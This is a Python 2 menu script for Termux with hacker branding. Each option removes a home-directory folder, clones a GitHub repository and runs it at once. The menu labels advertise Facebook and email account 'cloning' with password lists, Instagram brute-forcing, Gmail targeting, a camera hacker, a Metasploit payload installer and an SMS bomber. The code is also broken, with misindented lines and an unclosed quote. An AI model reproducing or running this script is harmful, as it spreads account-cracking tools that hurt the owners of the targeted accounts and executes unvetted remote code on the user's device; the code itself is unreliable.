#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

####  RANDOM Clour ####
P  = '\033[1;97m'  #
M  = '\033[1;91m' #
H  = '\033[1;92m' #
K = '\033[1;93m' #
B  = '\033[1;94m' #
U  = '\033[1;95m' #
O = '\033[1;96m' #

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
def pkgs():
        love("\033[1;91m«-----------------\033[1;96mHazratJunaid \033[1;91m-----------------»")
        love("\033[1;96m«-----------------Disclaimer---------------»")
        love("\033[1;91m     This Tool is for Educational Purpose")
        love("\033[1;93mThis presentation is for educational")
        love("\033[1;93mpurposes ONLY.How you use this information")
        love("\033[1;93mis your responsibility.I will not be")
        love("\033[1;93mheld accountable This Tool/Channel Doesn't")
        love("\033[1;93mSupport illegal activities.for any illegal")
        love("\033[1;93mActivitie This Tool is for Educational Purpose")
        love("\033[1;91m«------------------Hazrat Junaid----------------»")
        love("\033[1;95mHazratJunaid 2nd Tool Start ComingSoon New Update»")
        love("\033[1;96m «-----------------\033[1;92mHazrat Junaid\033[1;96m--------------»")
        time.sleep(0.3)
        os.system("pip install lolcat")
try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests")
        os.system("python2 HazratJunaid1.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\033[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.001)
t = threading.Thread(target=animate)
t.start()

time.sleep(5)
done = True

def keluar():
        print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
        os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.00001)
##### LOGO #####
logo = """
\033[1;96mPAK HACKERS░░░\033[1;92m░░░HazratJunaid╗░░WEBDEVELOPER╗░AND╗░░A\033[1;91mETICALHACKER╗
\033[1;96mYT╔══M4╗B4║░\033[1;92m░░░░WEBHACKER╔══PAK╗ANONAYMOUS╔══YOUTUBE╗CHANNEL║\033[1;91m░HazratJunaid_TermuX.Master╔╝
\033[1;96mPAKISTANI╦╝HACKERS\033[1;92m║░░░░░███████║██║░░╚═╝\033[1;91m█████═╝░
\033[1;96mWEBHACKER╔══HazratJunaid╗\033[1;92m██║░░░░░██╔══██║██║░░\033[1;91m██╗██╔═██╗░
\033[1;96mWHATSAPP\033[1;92m╦╝03232132362╗██║░░██║╚█\033[1;91m████╔╝██║░╚██╗
\033[1;96m╚═══\033[1;92m══╝░╚══════╝╚═╝░░╚═╝\033[1;91m░╚════╝░╚═╝░░╚═╝
\033[1;96mHACK\033[1;92mTHE╗░░░HACKERS╗░Khan╗░HACKERS\033[1;91m████╗██╗░█████╗░
\033[1;96mWE\033[1;92mARE╗░LEGION║WE╔══NEVER╗\033[1;91mFORGIVE╔════╝SPEED█║LIMIT█╔══INCREASED█╗
\033[1;92mVISIT╔█OUR█╔YT║█CHANNEL█\033[1;91mK4║█KhaN█╗░░M4║██MASTER██║
\033[1;92m██║╚██╔╝██║██╔\033[1;91m══██║██╔══╝░░██║██╔══██║
\033[1;92m██║░╚═╝░██║█\033[1;91m█║░░██║██║░░░░░██║██║░░██║
\033[1;92m╚═╝░░░░░╚═\033[1;91m╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
\033[1;47m\033[1;31m      PAKISTANI HACKER       \033[1;0m
\033[1;96m«-----------------\033[1;91mHazrat Junaid\033[1;96m-----------------»
\033[1;91m _       _   _       _ _____
\033[1;91m      | |     | \ | |     (_)  __ \
\033[1;91m      | |_   _|  \| | __ _ _| |  | |
\033[1;91m  _   | | | | | . ` |/ _` | | |  | |
\033[1;91m | |__| | |_| | |\  | (_| | | |__| |
 \033[1;91m \____/ \__,_|_| \_|\__,_|_|_____/


\033[1;91m  _  ___         _  _
\033[1;91m | |/ / |_  __ _| \| |
\033[1;91m | ' <| ' \/ _` | .` |
\033[1;91m |_|\_\_||_\__,_|_|\_|
\033[1;96m«-----------------\033[1;91mHazratJunaid\033[1;96m-----------------»"""

R = '\033[1;91m'
G = '\033[1;92m'
Y = '\033[1;93m'
B = '\033[1;94m'
P = '\033[1;95m'
S = '\033[1;96m'
W = '\033[1;97m'
######Clear######
def clear():
    os.system('clear')

#### time sleep ####
def t():
    time.sleep(1)                             
def t1():                                         
    time.sleep(0.01)
#### print std #love###
def love(z):
        for e in z + "\n":
                sys.stdout.write(e)
                sys.stdout.flush()
                t1()
def menu():
    os.system('clear')
    pkgs()
    os.system('clear')
    print(logo)
    os.system('clear')
    os.system('echo  Hazrat░░░░░░Junaid░░PAKISTANI░ETICAL░░HACKER | lolcat -a -F 0.1')
    os.system('echo  HazRaT░░░░░JunaiD██WEB██DEVELOPER░██ | lolcat -a -F 0.1')
    os.system('echo  WHATSAPP░░░░░0341000***4░░FOR THIS SCRIPT░ | lolcat -a -F 0.1')
    os.system('echo  CONTACT  ░░░░░ME ON WHATSAPP░░HazratJunaid CYBER HACKER░ | lolcat -a -F 0.1')
    os.system('echo  WE ARE ░░ANONAYMOUS░WE ARE LEGION WE NEVER GORFIVE | lolcat -a -F 0.1')
    os.system('echo  WE NEVER FORGET░ASPECT ░░ US ░KNOWLEDGE░IS░░FREE | lolcat -a -F 0.1')
    os.system('echo  HI, I AM Hazrat Junaid A ETICAL HACKER | lolcat -a -F 0.1')
    os.system('echo  WE ARE ANONYMOUS WE ARE LEGION WE NEVER FORGIVE WE NEVER FORGET ASPECT US | lolcat -a -F 0.1')
    os.system('echo  Hazrat Junaid WHATSAPP = 0341000***4 | lolcat -a -F 0.1')
    os.system('echo  VISIT OUR YOUTUBE CHANNEL KhaN M4 MASTER | lolcat -a -F 0.1')
    os.system('echo  PAKISTANI ETICAL HACKER AND A PROGRAMMER | lolcat -a -F 0.1')
    os.system('echo  LETS░░░░░ENJOY░░OUR░░░░░TOOL░░THANKS | lolcat -a -F 0.1')
    os.system('echo  ------ Your Mind is Your Best Weapon------&&date  | lolcat -a -F 0.1')
    os.system('echo ----------------Hazrat Junaid-----------------| lolcat')
    os.system('echo       _       _   _       _ _____             lolcat --animate') 
os.system('echo       | |     | \ | |     (_)  __ \              lolcat --animate')
 os.system('echo      | |_   _|  \| | __ _ _| |  | |            lolcat --animate')
 os.system('echo  _   | | | | | . ` |/ _` | | |  | |               lolcat --animate') 
os.system('echo  | |__| | |_| | |\  | (_| | | |__| |            lolcat --animate') 
 os.system('echo  \____/ \__,_|_| \_|\__,_|_|_____/ lolcat --animate') 


 os.system('echo  _  ___         _  _       lolcat --animate') 
os.system('echo  | |/ / |_  __ _| \| |      lolcat --animate') 
os.system('echo  | ' <| ' \/ _` | .` |        lolcat --animate') 
os.system('echo  |_|\_\_||_\__,_|_|\_| lolcat --animate') 
    os.system('echo -----------------Hazrat Junaid----------------| lolcat --animate')
    os.system('echo    To return to this menu from any Tool| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo        Stop Process Press. CTRL + z| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo         Type python2 HazratJunaid1.py| lolcat --animate')
    os.system('echo -----------------HazratJunaid----------------| lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [A]  Install Random Mail Cloning--------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [B]  Install Email Cloning--------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [C]  Install Manual Password------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [D]  Install Group Cloning--------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [E]  Install With Out Fb Id-------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [F]  Install Facebook Target------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [G]  Install SpiderMan------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [H]  Install Kalilinux------------------------- Tool ----●  | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [I]  Install BlackHat-------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [J]  Install RedMoonNew------------------------ Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [K]  Install love3Hack3r----------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [L]  Install Hazrat Junaid1 Clonnig----------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [M]  Install Web Admin Panel Finder------------ Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [N]  Install Attacker-------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [O]  Install Payload--------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [P]  Install CamHacker------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [Q]  Install Compiler-------------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [R]  Install Instagram Brut-------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [S]  Install Marsh Base------------------------ Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [T]  Install Gmail Target---------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [U]  Install Termux Logo----------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [V]  Install Termux TBomb---------------------- Tool ----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [W]  HazratJunaid1 WhatsApp Group-------- Tool----● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [X]  HazratJunaid1 Dragon404 New Update -----● | lolcat -a -F 0.01')
    time.sleep(0.0005)
    os.system('echo [Y]  Tool Update--------------------------● | lolcat --animate')
    time.sleep(0.0005)
    os.system('echo [Z]  EXIT | lolcat -a -F 0.1')
    time.sleep(0.0005)
    os.system('echo Slect Option A-Z➣➤| lolcat -a -F 0.1 ')
    mafia()
def mafia():
        black = raw_input('\033[1;91m┺\033[1;92m──\033[1;97m──\033[1;96m──\033[1;95m──\033[1;94m──\033[1;92m──\033[1;96m──━\033[1;93m➢\033[1;92m➣\033[1;91m➤')
        if black =="":
                print ("  HazratJunaid1")
                mafia()
        elif black =="A" or black =="a":
                clear()
                print(logo)
                os.system("rm -rf $HOME/random")
                clear()
                os.system("cd $HOME && git clone https://github.com/lovehacker404/random")
                print (logo)
                time.sleep(5)
                os.system("cd $HOME/random && python2 lovehacker.py")
        elif black =="B" or black =="b":
                clear()
                print(logo)
                os.system("rm -rf $HOME/email")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/email")
                print (logo)
                time.sleep(5)
                os.system("cd $HOME/email && python2 lovehacker.py")
        elif black =="C" or black =="c":
                clear()
                print(logo)
                os.system("rm -rf $HOME/Password")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/Password")
                print (logo)
                time.sleep(5)
                os.system("cd $HOME/Password && python2 lovehacker.py")
        elif black =="D" or black =="d":
                clear()
                print(logo)
                os.system("rm -rf $HOME/lovehack")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/lovehack")
                print (logo)
                time.sleep(5)
                os.system("cd $HOME/lovehack && python2 lovehacker.py")
        elif black =="E" or black =="e":
                clear()
                print(logo)
                os.system("rm -rf $HOME/402")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/402")
                print (logo)
                love("\033[1;93mTool User Name :\033[1;95m     Hazrat ")
                love("\033[1;93mTool Password  :\033[1;95m     Junaid ")
                time.sleep(5)
                os.system("cd $HOME/402 && python2 Cloningx-2-1.py")
        elif black =="F" or black =="f":
                clear()
                print(logo)
                os.system("rm -rf $HOME/blackhole")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/blackhole")
                print (logo)
                love("\033[1;93mTool User Name :\033[1;95m     Hazrat ")
                love("\033[1;93mTool Password  :\033[1;95m     Junaid ")
                love("\033[1;93m        :Target Attack  :     ")
                love("\033[1;93mPassword list  :\033[1;95mlovehacker-2.txt ")
                time.sleep(5)
                os.system("cd $HOME/blackhole && python2 AsifJaved.py")
        elif black =="G" or black =="g":
                clear()
                print(logo)
                os.system("rm -rf $HOME/Spider")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/Spider")
                print (logo)
                love("\033[1;91mCongratulations Cobra Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;93mTool User Name SpiderMan Password lovehacker")
                time.sleep(5)
                os.system("cd $HOME/Spider && python2 SpiderMan.py")
        elif black =="H" or black =="h":
                clear()
                print(logo)
                os.system("rm -rf $HOME/KaliIndia")
                os.system("cd $HOME && git clone https://github.com/lovehacker404/KaliIndia")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;93mTool User Name India Password lovehacker")
                time.sleep(5)
                os.system("cd $HOME/KaliIndia && python2 kalilinux.India.py")
        elif black =="I" or black =="i":
                clear()
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1")
                print (logo)
                love("\033[1;96mCongratulations BlackHat Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;93mTool User Name HazratJunaid1 Password HazratJunaid1")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="J" or black =="j":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;91mCongratulations HazratJunaid1 Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;93mTool User Name\033[1;92m HazratJunaid1\033[1;93m Password \033[1;92mHazratJunaid1")
                time.sleep(6)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="K" or black =="k":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="L" or black =="l":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;93mCongratulations HazratJunaid1  Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;95mTool Dont Have Username And Password Enjoy But Use 786786 Pass Or Username On My Tool Thanks")
                time.sleep(5)
                os.system("cd $HOME/Cobra && python2 HazratJunaid1.py")
        elif black =="M" or black =="m":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;91mCongratulations HazratJunaid1  Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;96mAdmin Panel Finder")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid.py")
        elif black =="N" or black =="n":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1'')
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulation HazratJunaid1 Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;92mBest Script")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="O" or black =="o":
                clear()
                print(logo)
                print(logo)
                os.system("pkg install unstable-repo")
                os.system("pkg install metasploit")
                os.system("pkg install msfconsole")
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;93mCongratulations HazratJunaid1 Payload Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python3 HazratJunaid1.py")
        elif black =="P" or black =="p":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations CamHacker Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("\033[1;92mEducational Perpose only")
                time.sleep(2)
                os.system("cd $HOME/HazratJunaid1 && python HazratJunaid1.py")
        elif black =="Q" or black =="q":
                clear()
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;93mCongratulations  Tool Has Been Update Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="R" or black =="r":
                clear()
                print(logo)
                print(logo)
                os.system("pip2 install bs4")
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;93mCongratulations  Tool Has Been Update Successfully")
                love("Now you can open this tool as usual")
                love("Passwordlist No1 (wordlist.txt) No2 (BlackMafia.txt)")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="S" or black =="s":
                clear()
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;93mCongratulations  Tool Has Been Update Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="T" or black =="t":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations GmailAttack Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                love("plz wi8 Password list name (lovehacker-1.txt) ")
                time.sleep(6)
                os.system("cd $HOME/GmailAttack && python2 HazratJunaid1.py")
        elif black =="U" or black =="u":
                clear()
                print(logo)
                print(logo)
                os.system("rm -rf $HOME/Logo")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 Logo  Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/Logo && bash HazratJunaid1.sh")
        elif black =="V" or black =="v":
                clear()
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 TBomb Tool Has Been Installed Successfully")
                love("Now you can open this tool as usual")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && bash HazratJunaid1.sh")
        elif black =="W" or black =="w":
                clear()
                print(logo)
                love("Welcome To HazratJunaid1 M4 MASTER WhatsApp Group")
                time.sleep(5)
                os.system('xdg-open https://chat.whatsapp.com/BcmyQPBz6lz3t6oVN8wLoi')
        elif black =="X" or black =="x":
                clear()
                print(logo)
                love("Welcome To HazratJunaid1 2nd Tool")
                love("HazratJunaid1 2nd Tool Start")
                love("Coming Soon New Update")
                time.sleep(5)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 Tool Has Been Installed Successfully")
                love("Wellcom to HazratJunaid1 tool")
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="Y" or black =="y":
                clear()
                print(logo)
                os.system("rm -rf $HOME/HazratJunaid1")
                os.system("pip install lolcat")
                os.system("cd $HOME && git clone https://github.com/Abidkhan7/HazratJunaid1.git")
                print (logo)
                love("\033[1;96mCongratulations HazratJunaid1 Tool Has Been Update Successfully")
                time.sleep(5)
                os.system("cd $HOME/HazratJunaid1 && python2 HazratJunaid1.py")
        elif black =="Z" or black =="z":
            os.system("exit")
if __name__ == "__main__":
    menu()
